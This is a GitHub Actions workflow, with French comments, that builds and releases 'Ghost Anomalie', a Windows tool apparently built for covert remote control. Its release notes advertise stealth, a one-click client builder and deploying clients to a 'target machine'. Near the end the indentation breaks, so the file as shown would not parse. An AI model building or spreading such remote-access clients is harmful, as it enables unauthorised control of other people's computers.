name: 🚀 Build Ghost Anomalie

on:
  push:
    tags:
      - 'v*'              # Déclenché quand tu pousses un tag comme v1.0.0
  workflow_dispatch:       # Permet de lancer manuellement depuis l'interface GitHub

permissions:
  contents: write
  issues: write
  pull-requests: write

env:
  APP_NAME: GhostAnomalie
  VERSION: 1.3.0.3
  CONFIGURATION: Release

jobs:
  build:
    name: 🪟 Build Windows Application
    runs-on: windows-latest
    
    steps:
      # ===== 1. Récupérer le code =====
      - name: 📥 Checkout code
        uses: actions/checkout@v4
        with:
          fetch-depth: 0
      
      # ===== 2. Configurer .NET =====
      - name: 🎯 Setup .NET
        uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '6.0.x'
      
      # ===== 3. Restaurer les dépendances =====
      - name: 📦 Restore dependencies
        run: dotnet restore GhostAnomalie.sln
      
      # ===== 4. Build la solution =====
      - name: 🔧 Build solution
        run: dotnet build GhostAnomalie.sln --configuration ${{ env.CONFIGURATION }} --no-restore
      
      # ===== 5. Publier l'application =====
      - name: 📦 Publish application
        run: |
          dotnet publish src/GhostAnomalie.Server/GhostAnomalie.Server.csproj `
            --configuration ${{ env.CONFIGURATION }} `
            --output publish `
            --runtime win-x64 `
            --self-contained false `
            -p:DebugType=none `
            -p:DebugSymbols=false
      
      # ===== 6. Créer le ZIP =====
      - name: 📦 Create ZIP package
        run: |
          mkdir release
          copy publish\GhostAnomalie.exe release\
          echo "📦 Package created" >> release/info.txt
          echo "Ghost Anomalie v${{ env.VERSION }}" >> release/info.txt
          echo "Build date: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" >> release/info.txt
          Compress-Archive -Path release\* -DestinationPath release\GhostAnomalie_${{ env.VERSION }}.zip
      
      # ===== 7. Upload des artefacts =====
      - name: 📤 Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: GhostAnomalie
          path: release/
      
      # ===== 8. Créer la Release sur GitHub =====
      - name: 🚀 Create GitHub Release
        uses: softprops/action-gh-release@v2
        with:
          files: |
            release/GhostAnomalie.exe
            release/GhostAnomalie_${{ env.VERSION }}.zip
          draft: false
          prerelease: false
          tag_name: ${{ github.ref_name }}
          name: Ghost Anomalie ${{ github.ref_name }}
          body: |
            # 👻 Ghost Anomalie ${{ github.ref_name }}
            
            > **⚠️ WARNING: EDUCATIONAL PURPOSE ONLY - Use on your own devices or with explicit written consent.**
            
            ## 🚀 What's New
            
            - 🖥️ **Full Remote Control** - Complete administration suite
            - 🔐 **Secure & Stealthy** - Encrypted communication
            - 🎯 **Integrated Client Builder** - Generate custom clients in one click
            - 📡 **Dark Modern Interface** - Professional hacker-style UI
            - ⚡ **Fast & Lightweight** - Only ~3-5 MB
            
            ## 📥 Download
            
            | File | Description |
            |------|-------------|
            | **GhostAnomalie.exe** | Controller application (Windows) |
            | **GhostAnomalie_${{ env.VERSION }}.zip** | Complete package |
            
            ## 🔧 Quick Start
            
Launch GhostAnomalie.exe

Configure port and password

Click "START SERVER"

Go to "Builder" tab

Configure server IP

Click "GENERATE CLIENT .EXE"

Deploy client to target machine

Control from the server!

text

